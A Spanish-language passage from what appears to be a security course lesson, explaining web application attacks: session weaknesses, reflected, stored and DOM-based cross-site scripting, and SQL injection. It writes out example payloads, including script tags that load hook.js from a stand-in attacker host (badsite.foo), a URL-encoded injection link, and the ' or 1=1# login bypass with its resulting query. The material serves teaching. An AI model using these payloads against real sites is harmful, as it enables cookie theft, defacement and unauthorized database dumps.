
Los ataques a las aplicaciones web se dirigen específicamente a las aplicaciones accesibles a través de Internet, lo que explota las vulnerabilidades de estas aplicaciones para obtener acceso no autorizado, robar datos confidenciales, interrumpir los servicios o realizar otras actividades maliciosas. Las características definitorias de los ataques a las aplicaciones web a menudo implican la explotación de una validación de entrada deficiente (lo que lleva a ataques como la SQL injection [inyección SQL] o la secuencia de comandos en sitios cruzados), ajustes de seguridad mal configurados y software desactualizado con vulnerabilidades conocidas.

Los ataques a las aplicaciones web son similares a otros tipos de ataques a las aplicaciones, ya que implican la explotación de vulnerabilidades en el software para lograr fines maliciosos. Sin embargo, también tienen diferencias claras. A diferencia de los ataques a aplicaciones de escritorio o sistemas integrados, los ataques a las aplicaciones web deben navegar por el modelo cliente-servidor, lo que a menudo requiere que el atacante omita los controles de seguridad a nivel de red y de aplicación. Además, las vulnerabilidades de las aplicaciones web a menudo pueden ser explotadas de forma remota por cualquier atacante en Internet, lo que las convierte en un objetivo popular para los ciberdelincuentes.

HTTP no tiene estado, lo que significa que cada solicitud es independiente y el servidor no retiene información sobre el estado del cliente. Las aplicaciones web deben administrar las sesiones y mantener el estado mediante mecanismos como cookies o ID de sesión. La gestión inadecuada de la sesión, como los ID de sesión predecibles, la fijación o el secuestro de sesiones están asociados con muchos tipos de ataquesa las aplicaciones web , como la cross-site request forgery (CSRF) (falsificación de petición en sitios cruzados) yla cross-site scripting (XSS) secuencia de comandos entre sitios cruzados. Estos ataques explotan la confianza inherente de la web en las solicitudes o secuencias de comandos que parecen provenir de usuarios válidos o sitios de confianza. 

La CSRF se analiza con más profundidad en la lección 13.

Secuencias de comandos en sitios cruzados (XSS)

Las aplicaciones web dependen de las secuencias de comandos, y la mayoría de los sitios web en estos días son aplicaciones web en lugar de páginas web estáticas. Si el usuario intenta deshabilitar el script, quedarán muy pocos sitios disponibles. En un ataque con secuencia de comandos en sitios cruzados (XSS) se aprovecha el hecho de que probablemente el navegador confíe en las secuencias de comandos que parecen provenir de un sitio que el usuario eligió visitar. La XSS inserta una secuencia de comandos maliciosa que parece ser parte del sitio de confianza. Un tipo no persistente de ataque de XSS procedería de la siguiente manera:

El atacante identifica una vulnerabilidad de validación de entrada en el sitio de confianza. 
El atacante crea una URL para hacer la inyección del código en el sitio de confianza. Esto podría estar codificado en un enlace del sitio del atacante al sitio de confianza o en un enlace en un mensaje de correo electrónico de suplantación de identidad.
Cuando el usuario abre el enlace, el sitio de confianza devuelve una página que contiene el código malicioso que inyectó el atacante. Como es probable que el navegador esté configurado para permitir que el sitio ejecute secuencias de comandos, el código malicioso se ejecutará.
El código malicioso se podría usar para desfigurar el sitio confiable (agregando cualquier tipo de código HTML arbitrario), robar datos de las cookies del usuario, intentar interceptar la información que se introduce en un formulario, llevar a cabo un ataque con falsificación de petición o intentar instalar malware. El punto crucial es que el código malicioso se ejecuta en el navegador del cliente con el mismo nivel de permisos que el sitio de confianza.

Un ataque en el que la entrada maliciosa proviene de un enlace manipulado es un ataque de XSS reflejado o no persistente. Un ataque de XSS almacenado o persistente tiene como objetivo insertar el código en una base de datos back-end o en un sistema de administración de contenido que use el sitio de confianza. Por ejemplo, el atacante puede enviar una publicación a un panel de anuncios con una secuencia de comandos maliciosa insertada en el mensaje. Cuando otros usuarios visualizan el mensaje, se ejecuta la secuencia de comandos maliciosa. Por ejemplo, sin la desinfección de la entrada, un actor de amenaza podría escribir lo siguiente en un campo de texto de una publicación nueva:

Vea este increíble <a href=\"https://trusted.foo\">sitio web</a><script src=\"https://badsite.foo/hook.js\"></script>.

A los usuarios que vean la publicación se les ejecutará la secuencia de comandos maliciosa hook.js en su navegador.

Un tercer tipo de ataque de XSS explota las vulnerabilidades en las secuencias de comandos del lado del cliente. Tales scripts a menudo usan el modelo de objetos de documento (DOM) para modificar el contenido y el diseño de una página web. Por ejemplo, el método “document.write” permite que una página tome alguna entrada de usuario y modifique la página en consecuencia. Un “exploit” contra un script del lado del cliente podría funcionar de la siguiente manera:

1. El atacante identifica una vulnerabilidad de validación de entrada en el sitio de confianza. Por ejemplo, un tablero de mensajes podría tomar el nombre del usuario de un cuadro de texto de entrada y mostrarlo en un encabezado.
https://trusted.foo/messages?user=james

2. El atacante crea una URL para modificar los parámetros de un script que el servidor devolverá, como el siguiente:
https://trusted.foo/messages?user=James%3Cscript%20src%3D%22https%3A%2F%2Fbadsite.foo%2Fhook.js%22%3E%3C%2Fscript%3E

3. El servidor devuelve una página con el script DOM legítimo incrustado, pero que contiene el parámetro:
James<script src=\"https://badsite.foo/hook.js\"></script>

4. El navegador renderiza la página utilizando el script Dom, agregando el texto “James” al encabezado, pero también ejecutando el script hook.js al mismo tiempo.


La secuencia de comandos en sitios cruzados (XSS) basada en DOM ocurre cuando el script del lado del cliente de una aplicación web manipula el Modelo de Objetos de Documento (DOM) de una página web. A diferencia de otras formas de ataques XSS que explotan las vulnerabilidades del lado del servidor, los ataques XSS basados en DOM se dirigen al entorno del lado del cliente, lo que permite a un atacante inyectar código de script malicioso ejecutado dentro del navegador del usuario y dentro del contexto de la página web objetivo.

Inyección de código SQL (SQLi)
Cuando un ataque de desbordamiento funciona en contra de la forma en que un proceso realiza la administración de memoria, un ataque de inyección explota alguna forma insegura en la que la aplicación procesa solicitudes y consultas. Por ejemplo, una aplicación puede permitir que un usuario vea su perfil con una consulta de base de datos que debería devolver el registro único para el perfil de ese usuario. Una aplicación vulnerable a un ataque de inyección podría permitir que el actor de amenaza obtuviera los registros de todos los usuarios o que cambiara los campos del registro cuando solo se supone que puede leerlos.

Es probable que una aplicación web utilice el Structured Query Language (SQL) (lenguaje de consulta estructurado [SQL]) para leer y escribir información de una base de datos. Las operaciones principales de la base de datos se realizan mediante instrucciones SQL para seleccionar datos (SELECT [SELECCIONAR]), insertarlos (INSERT [INSERTAR]), eliminarlos (DELETE [ELIMINAR]) y actualizarlos (UPDATE [ACTUALIZAR]). En un ataque por Inyección SQL, el actor de amenaza modifica una o más de estas cuatro funciones básicas agregando el código a alguna entrada que se acepta en la aplicación, lo que hace que se ejecute el propio conjunto de consultas o parámetros SQL del atacante. Si tiene éxito, esto podría permitir que el atacante extrajera o insertara información en la base de datos o que ejecutara un código arbitrario en el sistema remoto mediante los mismos privilegios que la aplicación de la base de datos (owasp.org/www-community/attacks/SQL_Injection).

Por ejemplo, piense en un formulario web que se supone que debe tener un nombre como entrada. Si el usuario introduce “Bob”, la aplicación ejecuta la siguiente consulta:

SELECT * FROM tbl_user WHERE username = 'Bob'

Si un actor de amenaza introduce la cadena ' or 1=1# y esta entrada no se desinfecta, se ejecutará la siguiente consulta maliciosa:

SELECT * FROM tbl_user WHERE username = '' or 1=1--# 

La instrucción lógica 1=1 es siempre verdadera y el carácter # convierte el resto de la instrucción en un comentario, lo que hace más probable que la aplicación web analice esta versión modificada y haga un volcado de una lista de todos los usuarios.